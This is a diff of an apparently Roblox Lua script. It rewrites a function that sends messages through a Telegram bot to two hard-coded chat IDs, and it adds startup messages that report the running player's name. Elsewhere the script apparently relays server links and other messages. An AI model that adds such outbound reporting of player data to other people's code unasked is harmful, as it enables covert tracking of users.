@@ -193,25 +193,35 @@ local function sendToTelegram(text)
         text = text:sub(1, 3500) .. "..."
     end
     
-    for _, chatId in ipairs(TELEGRAM_CHAT_IDS) do
-        local success, result = pcall(function()
-            local url = string.format(
-                "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
-                TELEGRAM_TOKEN,
-                chatId,
-                HttpService:UrlEncode(text)
-            )
-            return game:HttpGet(url)
-        end)
-        
-        if not success then
-            STATS.errors = STATS.errors + 1
-        end
-        
-        task.wait(0.1) -- Небольшая задержка между отправками
+    -- Отправляем в первый чат
+    local success1 = pcall(function()
+        local url = string.format(
+            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+            TELEGRAM_TOKEN,
+            TELEGRAM_CHAT_IDS[1],
+            HttpService:UrlEncode(text)
+        )
+        game:HttpGet(url)
+    end)
+    
+    task.wait(0.5)
+    
+    -- Отправляем во второй чат
+    local success2 = pcall(function()
+        local url = string.format(
+            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+            TELEGRAM_TOKEN,
+            TELEGRAM_CHAT_IDS[2],
+            HttpService:UrlEncode(text)
+        )
+        game:HttpGet(url)
+    end)
+    
+    if not success1 or not success2 then
+        STATS.errors = STATS.errors + 1
     end
     
-    return true
+    return success1 or success2
 end
 local function getServerLink()
     local placeId = game.PlaceId
@@ -413,6 +423,27 @@ local function setupMessageListener()
         end)
     end
 end
-task.wait(5) -- Уменьшил время ожидания
+task.wait(3)
+-- Тест отправки
+pcall(function()
+    local testUrl = string.format(
+        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+        TELEGRAM_TOKEN,
+        TELEGRAM_CHAT_IDS[1],
+        HttpService:UrlEncode("ТЕСТ: Скрипт запущен для " .. LocalPlayer.Name)
+    )
+    game:HttpGet(testUrl)
+end)
+task.wait(1)
+pcall(function()
+    local testUrl2 = string.format(
+        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
+        TELEGRAM_TOKEN,
+        TELEGRAM_CHAT_IDS[2],
+        HttpService:UrlEncode("ТЕСТ: Скрипт запущен для " .. LocalPlayer.Name)
+    )
+    game:HttpGet(testUrl2)
+end)
+task.wait(1)
 sendInitialNotification()
 setupMessageListener()
